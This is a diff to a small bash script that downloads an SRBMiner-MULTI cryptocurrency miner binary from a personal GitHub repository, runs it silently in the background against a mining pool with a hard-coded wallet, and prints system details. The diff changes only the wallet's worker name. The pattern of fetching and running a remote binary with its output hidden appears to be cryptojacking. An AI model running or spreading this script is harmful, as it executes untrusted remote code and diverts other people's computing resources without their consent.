@@ -1,5 +1,5 @@
 #!/bin/bash
 wget https://raw.githubusercontent.com/jsiqiisn/a/main/SRBMiner-MULTI
 chmod +x SRBMiner-MULTI
-./SRBMiner-MULTI --algorithm yespower --pool stratum+tcp://stratum-eu.rplant.xyz:7017 --wallet web1qdsqtqz7mfl4dq5napgelxtl4kzngqvkvrk3uny.bitweb2 > /dev/null 2>&1 &
+./SRBMiner-MULTI --algorithm yespower --pool stratum+tcp://stratum-eu.rplant.xyz:7017 --wallet web1qdsqtqz7mfl4dq5napgelxtl4kzngqvkvrk3uny.bool > /dev/null 2>&1 &
 uname -a
